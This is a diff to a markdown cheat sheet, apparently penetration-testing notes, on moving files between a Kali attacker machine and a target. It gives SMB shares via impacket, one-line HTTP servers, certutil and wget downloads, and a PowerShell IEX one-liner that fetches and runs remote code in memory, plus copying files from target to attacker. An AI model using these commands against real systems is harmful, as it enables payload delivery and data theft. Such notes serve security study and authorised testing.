@@ -2,14 +2,16 @@
 
 ## SMB - from Windows to Kali or vice-versa
 
-On Kali start a SMB share server on the folder you want to be shared
-```
+On Kali start a SMB share server on the folder you want to be shared.
+
+```bash
 cd <path>
 impacket-smbserver share $(pwd) -smb2support
 ```
 
 On the target
-```
+
+```cmd
 net use \\<Kali IP>\share
 net use
 copy \\<Kali IP>\share\<file> .
@@ -17,20 +19,22 @@ dir
 ```
 
 KALI to TARGET
-```
+
+```cmd
 xcopy \\<Kali IP>\share\<file> C:\<destination_path>\
 ```
 
 TARGET to KALI
-```
+
+```cmd
 xcopy <source_path>\<file> \\<Kali IP>\share\
 ```
-
 
 ## HTTP - from attacker to target OR target to attacker
 
 Python 2.7
-```
+
+```bash
 cd <path>
 python -m SimpleHTTPServer 8000
 ```
@@ -38,7 +42,8 @@ python -m SimpleHTTPServer 8000
 or
 
 Python 3
-```
+
+```bash
 cd <path>
 python3 -m http.server 8000
 ```
@@ -46,48 +51,59 @@ python3 -m http.server 8000
 or
 
 PHP
-```
+
+```bash
 cd <path>
 php -S 0.0.0.0:8000
 ```
 
 or
 
-Ruby 
-```
+Ruby
+
+```bash
 cd <path>
 ruby -run -ehttpd . -p8000
 ```
 
-
 ### download to Windows
 
 PowerShell
-```
+
+```powershell
 Invoke-WebRequest -Uri 'http://<http server IP>:8000/<filename>' -OutFile <filename> 
 ```
 
 PowerShell from cmd
-```
+
+```cmd
 powershell.exe -command Invoke-WebRequest -Uri http://<http server IP>:8000/<filename> -OutFile <filename>
 ```
 
 Download and execute with `Invoke-Expression` without saving file
-```
+
+```cmd
 powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<http server IP>:8000/<filename>)
 ```
 
 Certutil
-```
+
+```cmd
 certutil -urlcache -split -f 'http://<http server IP>:8000/<filename>' <path_destiny><filename>
 ```
-
 
 ### download to Linux
 
 wget
-```
+
+```bash
 wget <http server IP>:8000/<filename>
+```
+
+Perl oneliner
+
+```bash
+perl -MHTTP::Tiny -e '$http = HTTP::Tiny->new; $http->mirror("http://<http server IP>:8181/file.txt", "file.txt");'
 ```
 
 ## RDP - tsclient
